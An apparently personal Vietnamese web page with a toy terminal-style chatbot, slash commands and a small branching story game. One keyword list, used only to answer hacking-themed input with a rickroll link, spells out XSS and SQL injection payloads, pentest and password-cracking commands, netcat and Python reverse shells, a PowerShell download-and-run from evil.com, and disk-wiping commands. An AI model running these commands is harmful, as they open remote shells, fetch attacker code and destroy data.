<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>DID YOU GET LOST ?</title>
<style>
/* Font + Reset + Background */
:root{
  --paper:#fff;  /* Background */
  --ink:#000;    /* Font + Edge */
  --grey:#555;   /* Tag/Note + tương phản ~7.4:1 */
  --font:ui-monospace,"SFMono-Regular",Menlo,Consolas,"Liberation Mono",monospace; /* System Fonts */
}
*{box-sizing:border-box}
html{background:var(--paper)}
/* Just read this elements man.  */
body{margin:0;padding:20px;min-height:100vh;min-height:100dvh;display:flex;align-items:center;justify-content:center;
  background:var(--paper);color:var(--ink);font-family:var(--font)}

/* Terminal + thanh trên (tên + nút) + Header, phụ đề */
.terminal{width:100%;max-width:1000px;background:var(--paper);border:2px solid var(--ink);padding:28px 32px 22px}
.topbar{display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid var(--ink);
  padding-bottom:8px;margin-bottom:14px;font-size:12px;letter-spacing:.06em;color:var(--grey)}
.topbar b{color:var(--ink)}
.hangup{background:var(--paper);border:1px solid var(--ink);color:var(--ink);font:11px var(--font);
  letter-spacing:.06em;padding:4px 8px;cursor:pointer}
.hangup:hover{background:var(--ink);color:var(--paper)}
.hangup:focus-visible{outline:2px solid var(--ink);outline-offset:2px}
h1{font-size:48px;line-height:1;letter-spacing:.03em;margin:2px 0}
.subtitle{font-size:13px;color:var(--grey);margin-bottom:16px}

/* Vùng log cuộn + kiểu từng loại dòng (JS chỉ gắn class, không gắn style) */
#log{height:480px;overflow-y:auto;padding-right:6px;margin-bottom:10px;font-size:14.5px;line-height:1.55;
  scrollbar-width:thin;scrollbar-color:var(--ink) var(--paper)}
/* overflow-wrap */
.line{white-space:pre-wrap;overflow-wrap:anywhere;margin-bottom:2px}
.line:empty{min-height:1.55em}
.sys,.tag,.reply-note{color:var(--grey)}
.reply-main{font-weight:700}
.reply-note{padding-left:16px;font-size:13px;margin-bottom:10px}

/* Hàng nhập (ẩn tới khi boot xong), ô input, chân trang, màn nhỏ, giảm chuyển động */
.input-row{display:flex;align-items:center;gap:8px;border-top:1px solid var(--ink);padding-top:10px;opacity:0;transition:opacity .4s ease}
.input-row.ready{opacity:1}
.prompt-label{font-weight:700;white-space:nowrap}
#userInput{flex:1;min-width:0;background:transparent;border:none;color:var(--ink);font:15px var(--font);caret-color:var(--ink)}
#userInput:focus{outline:none}
#userInput:focus-visible{outline:2px solid var(--ink);outline-offset:3px}   /* đặt SAU :focus để không bị đè (cùng độ ưu tiên) */
#userInput::placeholder{color:var(--grey)}
#userInput:disabled{opacity:.4}
.footer{margin-top:12px;font-size:11px;color:var(--grey);display:flex;justify-content:space-between;gap:8px}
@media (max-width:480px){h1{font-size:36px}#log{height:280px;font-size:13.5px}}
@media (prefers-reduced-motion:reduce){.input-row{transition:none}}
</style>
</head>
<body>

<!-- [H1] Cấu trúc giao diện: topbar > h1 > subtitle > #log > form#inputRow > footer. Chữ tĩnh sửa trực tiếp tại đây. -->
<div class="terminal">
  <div class="topbar">
    <span>Chatting &middot; <b>Did you get lost?</span> 
    <button class="hangup" id="hangupBtn" type="button">RESET</button>
  </div>
  <h1>DID YOU GET LOST ?</h1>
  <div class="subtitle">Welcome to my web.</div>
  <div id="log"></div>
  <!-- [FIX-08] dùng <form> để Enter gửi đúng cả khi gõ bằng bộ gõ tiếng Việt. [FIX-09] maxlength. [FIX-07] "INPUTT>" -> "INPUT>", có <label for>. -->
  <form class="input-row" id="inputRow" autocomplete="off">
    <label class="prompt-label" for="userInput">HERE &gt;</label>
    <input id="userInput" maxlength="200" spellcheck="false" placeholder="Input and Enter..." disabled>
  </form>
  <div class="footer"><span id="clock">TIME TO CONNECTION 00:00</span><span>1200/75 WORDS</span></div>
</div>

<script>

// Hàm bổ trợ lấy ngẫu nhiên 1 phần tử trong mảng
const getRandom = arr => arr[Math.floor(Math.random() * arr.length)];

const CONFIG = {
  bootLines: ["Hello,", "You've wandered quite far, anyway: Welcome."],
  hint: "Text and Enter.",
  youTag: "WHOAMI > ",
  DYGLTag: "STRAW > ",
  noteArrow: "VI > ",
  clockLabel: "TIME TO CONNECTION",
  speedBoot: 14, speedReply: 18,   // ms mỗi ký tự
  thinkDelay: 300, bootPause: 180,  // ms

  defaultName: "WHOAMI",
  namePrompt: "STRAW > Who are you?",
  nameGreeting: name => {
    const list = [
      `No one knows who they are in this universe. But I know your name is ${name}, interesting.`,
      `So this is how I and you call you, ${name}.`
    ];
    return getRandom(list);
  },
  nameChanged: name => `You have redefined yourself: ${name}.`,
  unknownCommand: cmd => `STRAW > "/${cmd}" is invalid.`,
  helpHeader: "Command List:",
  historyEmpty: "No history found.",
  gameHint: "Enter a number and press Enter.(or /exit)",
  gameInvalidChoice: name => `Invalid choice.`,
  get gameLocked() {
    const list = [
      "I will see you tomorrow, okay?",
      "Please wait until tomorrow."
    ];
    return getRandom(list);
  },
  gameQuit: name => `Goodbye, ${name}.`,
  gameFarewell: name => `See you later, ${name}.`,
  chatExitMsg: "RESET for again.",
};

const phraseBank = [
  { name: "xinchao",  
    keywords: ["chao","hi","bonjour","hello","cc","hola","hallo", "wtf", ":)"],
    // Dùng hàm để mỗi lần gọi entries() nó tự bốc ngẫu nhiên 1 cái
    entries: () => getRandom([
      { reply: "Hallo, was ist der neu?", vi: "Chàoo, có gì mới à?" },
      { reply: "Ah, du bist wieder da.", vi: "À, cậu lại đến rồi." },
      { reply: "Willkommen zurück.", vi: "Chào mừng trở lại." },
    ])
  },
 { 
    name: "thoitiet", 
    keywords: ["thoi tiet","mua","nang","lanh","nong","weather"],
    entries: () => getRandom([
      { reply: "Erm...", vi: "À..." },
      { reply: "Das Wetter draußen ist egal, oder?", vi: "Thời tiết bên ngoài đâu có quan trọng, đúng không?" }
    ])
  },
  { 
    name: "cv",       
    keywords: ["cong viec","lam viec","di lam","project","work","deadline","sep","du an"],
    entries: () => getRandom([
      { reply: "Ich bin auch~ Sehr muede... Bist du beschaeftig?", vi: "Tui cũng vậy, mệt vãi ò... Bận lắm à?" },
      { reply: "Arbeiten, arbeiten... Vergesst nicht zu atmen.", vi: "Làm việc, làm việc... Đừng quên thở đấy." }
    ])
  },
  { 
    name: "hacker",   
    keywords: [
    // 1. Hack & Web Injection (XSS, SQLi, Command Injection)
    "hack",
    "<script>",
    "<img src=x onerror=alert('hack')>",
    "javascript:alert(document.cookie)",
    "admin' OR '1'='1",
    "' UNION SELECT NULL, username, password FROM users--",
    "; cat /etc/passwd",
    "| id",
    "`whoami`",

    // 2. Pentest & Reconnaissance (Lệnh & Công cụ)
    "pentest",
    "nmap -sV -p- 192.168.1.1",
    "gobuster dir -u http://target.com -w words.txt",
    "nikto -h http://target.com",
    "sqlmap -u 'http://target.com/page?id=1' --batch",
    "hydra -l admin -P pass.txt ssh://192.168.1.1",
    "msfconsole",
    "burpsuite",
    "wireshark",

    // 3. Mật khẩu & Passwords (Dạng băm, bẻ khóa, chuỗi mẫu)
    "mat khau",
    "password",
    "123456",
    "password123",
    "admin123",
    "john --wordlist=rockyou.txt hash.txt",
    "hashcat -m 0 -a 0 hash.txt rockyou.txt",
    "5f4dcc3b5aa765d61d8327deb882cf99", // md5 of "password"
    "$2a$12$e8N...",

    // 4. Máy tính & Shell Execution (Reverse shell, Remote execution)
    "may tinh",
    "nc -e /bin/sh 10.0.0.1 4444",
    "python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect((\"10.0.0.1\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
    "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')\"",
    "cmd.exe /c calc.exe",
    "rm -rf / --no-preserve-root",
    "format C: /Q /Y"
  ],
    entries: () => getRandom([
      { reply: "Hmmmm... this really not rickroll:", 
      linkUrl: "https://youtu.be/dQw4w9WgXcQ", 
      vi:"No chac chan khph rickroll."}
    ])
  }
];

const fallbackBank = [   // dùng khi không danh mục nào khớp
  { reply: "Hmmmm... this really not rickroll:", 
    linkUrl: "https://youtu.be/dQw4w9WgXcQ", 
    vi:"No chac chan khph rickroll."},
  { reply: "Ok?", vi: "Ok?"}
];


function normalize(s){   // bỏ dấu + chữ thường (đã bỏ replace(/Đ/) dư vì toLowerCase đã đổi Đ -> đ)
  return s.toLowerCase().replace(/đ/g, "d").normalize("NFD").replace(/[\u0300-\u036f]/g, "");
}
const asWords = s => " " + normalize(s).replace(/[^\p{L}\p{N}]+/gu, " ").trim() + " ";
let BANK = []; // Chỉ khai báo BANK một lần; refreshBank() sẽ cập nhật mảng này.

function pickReply(raw){
  const text = asWords(raw);
  const hits = BANK.filter(category => category.keys.some(key => text.includes(key)));

  // Không có nhóm từ khóa phù hợp: chọn câu dự phòng hoặc câu người dùng tự thêm.
  if (!hits.length) {
    const savedCustom = Store.get("custom_phrases", []);
    const customReplies = Array.isArray(savedCustom) ? savedCustom : [];
    return getRandom([...fallbackBank, ...customReplies]);
  }

  // Có thể có nhiều nhóm cùng khớp; chọn ngẫu nhiên một nhóm.
  const category = getRandom(hits);

  // entries có thể là hàm trả về một câu ngẫu nhiên hoặc một mảng câu.
  return typeof category.entries === "function"
    ? category.entries()
    : getRandom(category.entries);
}

// [J4] Tham chiếu DOM + helper dựng dòng/gõ chữ + cơ chế hủy tác vụ dở khi bấm nút reset
const $ = id => document.getElementById(id);
const log = $("log"), inputRow = $("inputRow"), userInput = $("userInput"), hangupBtn = $("hangupBtn"), clockEl = $("clock");
const reducedMotion = () => matchMedia("(prefers-reduced-motion: reduce)").matches;   // [FIX-13] đọc mỗi lần, không chốt 1 lần
const sleep = ms => new Promise(r => setTimeout(r, ms));
const toBottom = () => { log.scrollTop = log.scrollHeight; };
let session = 0;   // [FIX-11] tăng mỗi lần reset; tác vụ async cũ thấy sid khác session thì tự dừng
function span(cls, text){ const s = document.createElement("span"); s.className = cls; s.textContent = text; return s; }
function addLine(cls, text = ""){ const d = document.createElement("div"); d.className = "line " + cls; d.textContent = text; log.append(d); toBottom(); return d; }
async function typeInto(el, text, speed, sid){
  const safeText = String(text ?? "");
  if (sid !== session) return false;

  // prefers-reduced-motion: hiện toàn bộ chữ ngay, nhưng vẫn dùng textContent.
  if (reducedMotion()) {
    el.textContent = safeText;
    toBottom();
    return sid === session;
  }

  for (let i = 1; i <= safeText.length; i++) {
    if (sid !== session) return false;
    el.textContent = safeText.slice(0, i);
    toBottom();
    await sleep(speed);
  }

  return sid === session;
}

let mode = "name";
function setMode(next){
  mode = next;
  userInput.placeholder =
    next === "name" ? "NAME and ENTER..." :
    next === "game" ? "NUMBER and ENTER, or /exit..." :
    "/help for command or just chatting... :v";
}

const DB_PREFIX = "DYGL:";
const Store = {
  get(key, fallback = null){
    try { const v = localStorage.getItem(DB_PREFIX + key); return v === null ? fallback : JSON.parse(v); }
    catch { return fallback; }
  },
  set(key, value){
    try { localStorage.setItem(DB_PREFIX + key, JSON.stringify(value)); return true; }
    catch { return false; } // hết dung lượng, hoặc chế độ duyệt web riêng tư chặn localStorage
  },
};

const MAX_LOG = 200;
function logMessage(who, text){
  const saved = Store.get("history", []);
  const hist = Array.isArray(saved) ? saved : [];
  hist.push({ who, text, ts: Date.now() });
  Store.set("history", hist.slice(-MAX_LOG));
}
function showHistory(n = 10){
  const count = Number.isFinite(n) ? Math.max(1, Math.min(MAX_LOG, Math.floor(n))) : 10;
  const saved = Store.get("history", []);
  const hist = (Array.isArray(saved) ? saved : []).slice(-count);
  if (!hist.length){ addLine("sys", CONFIG.historyEmpty); return; }
  hist.forEach(h => {
    const time = new Date(h.ts).toLocaleTimeString("vi-VN");
    addLine("sys", `[${time}] ${h.who}: ${h.text}`);
  });
}

// [N1] Luồng hỏi tên — MỚI. Chạy một lần khi chưa có tên lưu trong Store.
async function submitName(text, sid){
  const name = (text || CONFIG.defaultName).trim().slice(0, 24) || CONFIG.defaultName;
  Store.set("name", name);
  addLine("you").append(span("tag", CONFIG.youTag), text || "(bỏ trống)");
  toBottom();
  await sleep(CONFIG.thinkDelay);
  if (sid !== session) return;
  if (!(await typeInto(addLine("sys"), CONFIG.nameGreeting(name), CONFIG.speedReply, sid))) return;
  addLine("sys"); addLine("sys", CONFIG.hint); addLine("sys");
  setMode("chat");
  inputRow.classList.add("ready"); userInput.disabled = false; userInput.focus();
}
function setName(newName){   // dùng cho lệnh /name khi đang chat, khác với submitName (lúc mới vào)
  const name = (newName || CONFIG.defaultName).trim().slice(0, 24) || CONFIG.defaultName;
  Store.set("name", name);
  addLine("sys", CONFIG.nameChanged(name));
}

// [CMD1] Mọi tin nhắn bắt đầu bằng "/" được coi là LỆNH thay vì chat thường —
// MỚI. Cú pháp: /tên_lệnh tham_số... Thêm lệnh mới = thêm một mục vào đây.
const COMMANDS = {
  help:    { desc: "Command List:",
             run: () => { addLine("sys", CONFIG.helpHeader);
                           Object.entries(COMMANDS).forEach(([k, v]) => addLine("sys", `  /${k} — ${v.desc}`)); } },
  name:    { desc: "Name changing (/name <new-name>).",
             run: args => setName(args.join(" ")) },
  clear:   { desc: "Clear your log.",
             run: () => log.replaceChildren() },
  history: { desc: "History default 10 lines.",
             run: args => showHistory(Number(args[0]) || 10) },
  game:    { desc: "Start game.",
             run: () => startGame() },
  exit:    { desc: "Goodbye.",
             run: () => { addLine("sys", CONFIG.chatExitMsg); inputRow.classList.remove("ready"); userInput.disabled = true; } },
  add:     { desc: "Add fallback replies (/add reply1, vi1; reply2, vi2).",
             run: args => {
               // args là mảng các từ sau chữ /add, nối lại thành chuỗi đầy đủ
               const content = args.join(" ");
               const resultMsg = handleAddCustomPhrases(content);
               addLine("sys", resultMsg);
             } },
};
async function runCommand(raw){
  const tokens = raw.slice(1).trim().split(/\s+/);
  const cmd = (tokens.shift() || "").toLowerCase();
  const entry = COMMANDS[cmd];
  if (!entry){ addLine("sys", CONFIG.unknownCommand(cmd)); return; }
  await entry.run(tokens);
}

// BANK chỉ chứa các nhóm từ khóa cố định trong phraseBank.
// Câu người dùng thêm bằng /add được lưu riêng và dùng làm câu trả lời dự phòng.
function refreshBank(){
  BANK = phraseBank.map(category => ({
    ...category,
    keys: category.keywords.map(asWords)
  }));
}

// Chạy một lần khi trang khởi động để chuẩn hóa từ khóa.
refreshBank();

function handleAddCustomPhrases(inputStr){
  const lines = inputStr.split(";").map(line => line.trim()).filter(Boolean);
  if (!lines.length) return "Cú pháp không hợp lệ hoặc rỗng.";

  const newEntries = [];
  for (const line of lines){
    const commaIndex = line.indexOf(",");
    const reply = (commaIndex === -1 ? line : line.slice(0, commaIndex)).trim();
    const vi = commaIndex === -1 ? "..." : line.slice(commaIndex + 1).trim();
    if (reply) newEntries.push({ reply, vi: vi || "..." });
  }

  if (!newEntries.length) return "Không tìm thấy câu hợp lệ để thêm.";

  const saved = Store.get("custom_phrases", []);
  const customList = Array.isArray(saved) ? saved : [];
  const updatedList = [...customList, ...newEntries].slice(-100);

  if (!Store.set("custom_phrases", updatedList)){
    return "Không lưu được: trình duyệt chặn localStorage hoặc đã hết dung lượng.";
  }

  return `Đã thêm ${newEntries.length} câu vào nhóm trả lời dự phòng.`;
}



// [GAME1] ĐỊNH DẠNG CỐT TRUYỆN — đây là phần bạn sẽ thay bằng kịch bản của
// mình. Mỗi "node" là một đoạn thoại:
//   lines:   mảng chuỗi, gõ ra lần lượt (hỗ trợ "{name}" -> tên người chơi)
//   choices: mảng [{label, next}], next là id của node kế tiếp
//   end:     true nếu đây là node KẾT THÚC game (không có choices)
// STORY_START_NODE là node bắt đầu. Dưới đây chỉ là VÍ DỤ 5 node để bạn thấy
// đúng hình dạng dữ liệu — xoá và thay bằng cốt truyện thật của bạn.
const STORY_START_NODE = "start";
const STORY = {
  start: {
    lines: ["Một đêm mưa, {name} nhận được một tin nhắn lạ...", "Bạn có muốn mở nó không?"],
    choices: [
      { label: "Mở tin nhắn", next: "open" },
      { label: "Bỏ qua, tắt máy", next: "end_ignore" },
    ],
  },
  open: {
    lines: ["Tin nhắn chỉ có một dòng: 'Đừng tin ai.'"],
    choices: [
      { label: "Trả lời 'Ai đó?'", next: "end_reply" },
      { label: "Chặn số lạ", next: "end_block" },
    ],
  },
  end_ignore: { lines: ["Bạn tắt máy đi ngủ. Có lẽ đó là lựa chọn khôn ngoan nhất."], end: true },
  end_reply:  { lines: ["Không có phản hồi nào nữa... cho đến ngày mai."], end: true },
  end_block:  { lines: ["Số lạ bị chặn. Nhưng một số khác đã nhắn tới..."], end: true },
};

// [GAME2] Bộ máy chạy cốt truyện — KHÔNG CẦN SỬA phần này khi viết kịch bản
// mới, chỉ cần sửa STORY ở trên. gameState giữ node hiện tại.
let gameState = null;
function todayKey(){
  const d = new Date();
  const year = d.getFullYear();
  const month = String(d.getMonth() + 1).padStart(2, "0");
  const day = String(d.getDate()).padStart(2, "0");
  return `${year}-${month}-${day}`;
}
function isGameLockedToday(){ return Store.get("lastPlayed") === todayKey(); }

async function startGame(){
  if (isGameLockedToday()){
    addLine("sys", CONFIG.gameLocked);
    return;
  }
  if (!STORY[STORY_START_NODE]){
    addLine("sys", "Game configuration error: start node not found.");
    return;
  }
  gameState = { node: STORY_START_NODE };
  setMode("game");
  await playNode();
}

async function playNode(){
  if (!gameState) return;
  const sid = session;
  const node = STORY[gameState.node];
  if (!node || !Array.isArray(node.lines)){
    addLine("sys", "Game configuration error: node is missing or invalid.");
    gameState = null;
    setMode("chat");
    return;
  }

  const name = Store.get("name", CONFIG.defaultName);
  for (const raw of node.lines){
    const text = String(raw).replaceAll("{name}", name);
    if (!(await typeInto(addLine("sys"), text, CONFIG.speedReply, sid))) return;
    await sleep(reducedMotion() ? 0 : CONFIG.bootPause);
    if (sid !== session || !gameState) return;
  }

  if (node.end){ await endGame(); return; }
  if (!Array.isArray(node.choices) || node.choices.length === 0){
    addLine("sys", "Game configuration error: this node has no choices and is not an ending.");
    gameState = null;
    setMode("chat");
    return;
  }
  node.choices.forEach((choice, index) => addLine("sys", `  ${index + 1}. ${choice.label}`));
  addLine("sys", CONFIG.gameHint);
}

// Nhận lựa chọn của người chơi trong mode game.
async function handleGameInput(text){
  if (text.trim().toLowerCase() === "/exit"){
    quitGame();
    return;
  }
  if (!gameState) return;

  const node = STORY[gameState.node];
  const idx = Number(text) - 1;
  const choice = Number.isInteger(idx) ? node?.choices?.[idx] : null;
  if (!choice || !STORY[choice.next]){
    addLine("sys", CONFIG.gameInvalidChoice);
    return;
  }

  gameState.node = choice.next;
  await playNode();
}

function quitGame(){
  const name = Store.get("name", CONFIG.defaultName);
  addLine("sys", CONFIG.gameQuit(name));
  gameState = null;
  setMode("chat");
}

// Kết thúc game: ghi ngày đã chơi và khóa input cho đến khi người dùng RESET.
async function endGame(){
  const sid = session;
  const name = Store.get("name", CONFIG.defaultName);
  Store.set("lastPlayed", todayKey());
  gameState = null;
  addLine("sys");

  const completed = await typeInto(addLine("sys"), CONFIG.gameFarewell(name), CONFIG.speedReply, sid);
  if (!completed || sid !== session) return;

  inputRow.classList.remove("ready");
  userInput.disabled = true;
}

// [J5] runBoot — ĐƯỢC VIẾT LẠI: boot xong thì hỏi tên (nếu chưa có tên lưu),
// rồi mới mở chat. Nếu đã có tên từ lần trước (localStorage) thì bỏ qua bước hỏi.
async function runBoot(){
  const sid = session;
  for (const text of CONFIG.bootLines){
    if (!(await typeInto(addLine("sys"), text, CONFIG.speedBoot, sid))) return;
    await sleep(reducedMotion() ? 0 : CONFIG.bootPause);
    if (sid !== session) return;
  }
  const saved = Store.get("name");
  if (saved){
    addLine("sys"); addLine("sys", CONFIG.hint); addLine("sys");
    setMode("chat");
    inputRow.classList.add("ready"); userInput.disabled = false; userInput.focus();
    return;
  }
  setMode("name");
  if (!(await typeInto(addLine("sys"), CONFIG.namePrompt, CONFIG.speedBoot, sid))) return;
  inputRow.classList.add("ready"); userInput.disabled = false; userInput.focus();
}

// [J6] handleSubmit — ĐƯỢC VIẾT LẠI: phân luồng theo mode (name/game/chat),
// trong "chat" thì "/..." đi vào lệnh (CMD1), còn lại đi vào chat thường như cũ.
async function handleSubmit(ev){
  ev.preventDefault();
  const text = userInput.value.trim();
  const sid = session;
  userInput.value = "";

  if (mode === "name"){ userInput.disabled = true; await submitName(text, sid); return; }
  if (!text) return;
  userInput.disabled = true;

  if (mode === "game"){
    addLine("you").append(span("tag", CONFIG.youTag), text);
    toBottom();
    await handleGameInput(text);
    // Nếu game đã kết thúc thì giữ input khóa; /exit thì quay về chat và mở lại.
    if (sid === session && (mode === "chat" || gameState !== null)){
      userInput.disabled = false;
      userInput.focus();
    }
    return;
  }

  addLine("you").append(span("tag", CONFIG.youTag), text);
  toBottom();

  if (text.startsWith("/")){
    await runCommand(text);
    // /exit chủ động ẩn và khóa input, không bật lại ngay sau khi chạy lệnh.
    if (sid === session && inputRow.classList.contains("ready") && mode !== "name" && (mode !== "game" || gameState !== null)){
      userInput.disabled = false;
      userInput.focus();
    }
    return;
  }

  logMessage(Store.get("name", CONFIG.defaultName), text);
  await sleep(CONFIG.thinkDelay);
  if (sid !== session) return;

  const reply = pickReply(text);
  const line = addLine("DYGL");
  const main = span("reply-main", "");
  line.append(span("tag", CONFIG.DYGLTag), main);

  // In phần chữ bình thường trước
  if (!(await typeInto(main, reply.reply, CONFIG.speedReply, sid))) return;

  // Nếu có link thì tạo hẳn thẻ a bằng DOM, chuẩn chỉnh 100%, không sợ dính lỗi file://
  if (reply.linkUrl) {
      const link = document.createElement("a");
      link.href = reply.linkUrl;
      link.target = "_blank";
      link.rel = "noopener noreferrer";
      link.textContent = "[rickroll]";
      main.append(" ", link);
  }

  addLine("reply-note", CONFIG.noteArrow + reply.vi);
  logMessage("DYGL", reply.reply + (reply.linkUrl ? " [rickroll]" : ""));
  userInput.disabled = false;
  userInput.focus();
};
// [J7] Gắn sự kiện, đồng hồ, khởi động — GIỮ NGUYÊN, chỉ thêm gameState=null
// vào handler của nút BUTTON (EXT-02) để không còn kẹt ở minigame cũ sau khi
// bấm "hangup". Lưu ý: hangup KHÔNG xoá tên đã lưu — reconnect không hỏi lại tên.
inputRow.addEventListener("submit", handleSubmit);
let startedAt = Date.now();
function renderClock(){
  const s = Math.floor((Date.now() - startedAt) / 1000), p = n => String(n).padStart(2, "0");
  clockEl.textContent = `${CONFIG.clockLabel} ${p(Math.floor(s / 60))}:${p(s % 60)}`;
}
hangupBtn.addEventListener("click", () => {
  session++;
  gameState = null;                        // [EXT-02]
  log.replaceChildren(); userInput.value = "";
  inputRow.classList.remove("ready"); userInput.disabled = true;
  startedAt = Date.now(); renderClock();
  runBoot();
});
setInterval(renderClock, 1000);
runBoot();
</script>
